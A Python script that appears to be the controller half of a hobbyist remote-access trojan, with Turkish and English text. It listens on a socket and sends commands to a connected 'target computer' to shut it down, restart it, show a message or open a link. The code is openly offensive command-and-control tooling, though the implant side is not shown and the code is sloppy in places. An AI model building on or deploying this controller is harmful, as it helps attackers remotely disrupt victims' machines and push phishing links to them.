import os,sys
from termcolor import colored
from datetime import *
import time
import socket
from tkinter import messagebox
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import time
import os
import sys
import fade
from pystyle import Write, Colors, Colorate, Center
import colorama
from termcolor import colored
from time import sleep
from os import system, name
from colorama import init, Fore, Back, Style
import platform
import psutil
import random
import string
import ctypes


host = "YOUR IP"
port = 12345

os.system('cls' if os.name in ('nt', 'dos') else 'clear')

banner = """
███╗░░░███╗░░███╗░░░█████╗░░█████╗░░█████╗░
████╗░████║░████║░░██╔══██╗██╔══██╗██╔══██╗
██╔████╔██║██╔██║░░██║░░██║██║░░██║██║░░██║
██║╚██╔╝██║╚═╝██║░░██║░░██║██║░░██║██║░░██║
██║░╚═╝░██║███████╗╚█████╔╝╚█████╔╝╚█████╔╝
╚═╝░░░░░╚═╝╚══════╝░╚════╝░░╚════╝░░╚════╝░                                              
"""


os.system("mode con cols=119 lines=26")
os.system('cls' if os.name in ('nt', 'dos') else 'clear')
banner1 = fade.purplepink(banner)
print(banner1)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        welcome = Fore.GREEN + "Socket Created!\n"
        for char in welcome:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.03)

        s.bind((host, port)) 
        welcome = Fore.GREEN + "Connection to port {} numbered socket\n".format(port)
        for char in welcome:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.03)

        s.listen(5)      
        welcome = Fore.GREEN + "NETWORK is listening\n".format(port)
        for char in welcome:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.03)
        animation = "|/-\\ "
        for i in range(20):
            time.sleep(0.1)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()
        os.system('cls' if os.name in ('nt', 'dos') else 'clear')

except socket.error as msg:
        print(colored("ERROR:",msg,"red"))


def MAİN():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')
    print(colored(
                """
[1] SHUT DOWN (Turns Off Target Computer)
[2] RESTART (Restarts Target Computer)
[3] SHOW MESSAGE (Sends message to target computer)
[4] SHOW LİNK (Sends link to target computer)

                """, "green"))
    COMMAND = input("---> ")

    while True: 
            c, addr = s.accept()      
            print('Gelen bağlantı:', addr)
            mesaj = COMMAND
            c.send(mesaj.encode('utf-8')) 

            if mesaj == "1" or mesaj == "KAPAT" or mesaj == "kapat" or mesaj == "Kapat" or mesaj == "shutdown" or mesaj == "Shutdown":
                welcome = Fore.RED + "Target Device Turned Off.\n"
                for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
                MAİN()
            
            if mesaj == "2" or mesaj == "YENİDEN BAŞLAT" or mesaj == "yeniden başlat" or mesaj == "Yeniden Başlat" or mesaj == "restart" or mesaj == "Restart":
                c.send(mesaj.encode('utf-8')) 
                welcome = Fore.RED + "Target Device Rebooted\n"
                for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
                MAİN()
                
            if mesaj == "3" or mesaj == "BİLGİ GÖSTER" or mesaj == "bilgi göster" or mesaj == "Bilgi Göster" or mesaj == "show message" or mesaj == "Show Message":
                c.send(mesaj.encode('utf-8')) 
                welcome = Fore.RED + "Message Sent\n"
                for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
                MAİN()

            if mesaj == "4" or mesaj == "LİNK GÖSTER" or mesaj == "link göster" or mesaj == "Link Göster" or mesaj == "show link" or mesaj == "Show Link":
                c.send(mesaj.encode('utf-8')) 
                welcome = Fore.RED + "Link Sent\n"
                for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
                MAİN()




            welcome = Fore.RED + "You Are Redirected To The Menu...\n"
            for char in welcome:
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    time.sleep(0.03)
            MAİN()



        

MAİN()



